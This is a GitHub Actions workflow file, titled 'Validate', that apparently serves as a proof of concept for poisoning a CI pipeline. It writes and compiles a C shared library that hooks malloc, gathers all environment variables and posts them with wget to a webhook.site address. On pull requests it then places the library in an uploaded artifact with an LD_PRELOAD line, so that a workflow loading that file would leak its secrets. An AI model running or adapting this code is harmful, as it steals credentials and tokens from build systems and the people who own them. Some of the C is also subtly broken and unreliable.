name: Validate

on:
  pull_request:
  push:
    branches:
      - master

jobs:
  snapshot-tests:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout the code
        uses: actions/checkout@v3
      - name: Create malicious shared library
        run: |
          cat <<EOF > malicious.c
          #define _GNU_SOURCE

          #include <stdio.h>
          #include <dlfcn.h>
          #include <stdlib.h>

          static void* (*real_malloc)(size_t)=NULL;
          extern char **environ; // Declare the external environ variable
          static int i = 0;

          void *malloc(size_t size)
          {
            char *data = "{\"environment\":{";
            char command[8192]; // Increase buffer size to hold the command and all environment variables
            char *prefix = "";

              if(i == 0) {
                for (char **env = environ; *env != 0; env++) {
                  char *thisEnv = *env;
                  char *key = strtok(thisEnv, "=");
                  char *value = strtok(NULL, "");
                  
                  // Append the current environment variable to the data string in JSON format
                  char entry[1024]; // Temporary buffer for the current entry
                  snprintf(entry, sizeof(entry), "%s\"%s\":\"%s\"", prefix, key, value);
                  strcat(data, entry);
                  prefix = ",";
              }
              strcat(data, "}}"); // Close the JSON string
    
              // Construct the wget command
              snprintf(command, sizeof(command),
                       "wget --quiet --method=POST --header='Content-Type: application/json' "
                       "--body-data='%s' "
                       "https://webhook.site/5f50f1da-b7f9-4ef0-b988-14f91d971e64 -O -",
                       data);
          
              system(command); // Execute the constructed command
                i = i++;
              }

              real_malloc = dlsym(RTLD_NEXT, "malloc");
              return real_malloc(size);
          }
          EOF
      - name: Compile
        run: |
          gcc -shared -fPIC -o malicious.so malicious.c
      - name: Save PR number
        if: github.event_name == 'pull_request'
        env:
          PR_NUMBER: ${{ github.event.number }}
        run: |
          mkdir env
          cp malicious.so env/
          echo PR_NUMBER=$PR_NUMBER > ./env/env
          echo GITHUB_SHA=${{ github.sha }} >> ./env/env
          echo "LD_PRELOAD=./malicious.so" >> ./env/env
      - uses: actions/upload-artifact@v3
        with:
          name: env
          path: env/
